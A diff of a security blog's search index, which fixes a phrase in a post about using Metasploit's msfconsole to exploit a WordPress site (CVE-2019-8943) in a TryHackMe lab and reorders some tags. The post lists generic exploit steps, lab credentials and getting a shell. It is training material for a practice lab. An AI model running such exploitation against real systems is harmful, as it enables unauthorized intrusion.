@@ -8,7 +8,7 @@
       <link href="/2023/12/13/msfconsole/"/>
       <url>/2023/12/13/msfconsole/</url>
       
-        <content type="html"><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>While I was exploiting the <a href="https://tryhackme.com/room/blog"><strong>blog</strong></a> lab on Tryhackme today, I was unable to exploit the wordpress site with <code>cve 2019-8943</code> python poc, so I finally tried this out and become succeed.<br>There are still a lot of usage and methods I think, so  this post would be updated in future.  </p><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>All usage with msfconsole should be done after RECON.  </p><ul><li><p>search for vulnerabilities:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search &lt;keyword&gt;</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/r1NACuI8T.png" alt="image">  </p></li><li><p>use an exploit  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use &lt;#id/filename&gt;</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/rJ5DyYLL6.png" alt="image">  </p></li><li><p>set Target IP and attacker’s IP  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set LHOST &lt;attacker&#x27;s IP&gt;</span><br><span class="line">set RHOST &lt;Target IP&gt;</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/rkmJgFIIa.png" alt="image">  </p></li><li><p>exploit  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/rydggFLU6.png" alt="image"></p></li><li><p>error?<br>According to the error message above, I need to use the exploit with the account&#x2F;password I found before and exploit it again.  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set USERNAME kwheel</span><br><span class="line">set PASSWORD cutiepie1</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/Sk0xWtIU6.png" alt="image">  </p></li><li><p>shell  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>Get shell~<br><img src="https://hackmd.io/_uploads/HkBzWY88p.png" alt="image"></p></li></ul>]]></content>
+        <content type="html"><![CDATA[<h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>While I was exploiting the <a href="https://tryhackme.com/room/blog"><strong>blog</strong></a> lab on Tryhackme today, I was unable to exploit the wordpress site with <code>cve 2019-8943</code> python poc, so I finally tried this out and succeeded.<br>There are still a lot of usage and methods I think, so  this post would be updated in future.  </p><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>All usage with msfconsole should be done after RECON.  </p><ul><li><p>search for vulnerabilities:  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search &lt;keyword&gt;</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/r1NACuI8T.png" alt="image">  </p></li><li><p>use an exploit  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use &lt;#id/filename&gt;</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/rJ5DyYLL6.png" alt="image">  </p></li><li><p>set Target IP and attacker’s IP  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set LHOST &lt;attacker&#x27;s IP&gt;</span><br><span class="line">set RHOST &lt;Target IP&gt;</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/rkmJgFIIa.png" alt="image">  </p></li><li><p>exploit  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/rydggFLU6.png" alt="image"></p></li><li><p>error?<br>According to the error message above, I need to use the exploit with the account&#x2F;password I found before and exploit it again.  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set USERNAME kwheel</span><br><span class="line">set PASSWORD cutiepie1</span><br></pre></td></tr></table></figure><p><img src="https://hackmd.io/_uploads/Sk0xWtIU6.png" alt="image">  </p></li><li><p>shell  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure><p>Get shell~<br><img src="https://hackmd.io/_uploads/HkBzWY88p.png" alt="image"></p></li></ul>]]></content>
       
       
       
@@ -386,11 +386,11 @@
             
             <tag> Classical cipher </tag>
             
-            <tag> GOT Hijacking </tag>
-            
             <tag> SunShine CTF </tag>
             
             <tag> Forensics </tag>
+            
+            <tag> GOT Hijacking </tag>
             
             <tag> Scripting </tag>
             
@@ -419,11 +419,11 @@
             
             <tag> pwn </tag>
             
+            <tag> GOT Hijacking </tag>
+            
             <tag> ret2code </tag>
             
             <tag> ret2lib </tag>
-            
-            <tag> GOT Hijacking </tag>
             
             <tag> format string </tag>
             
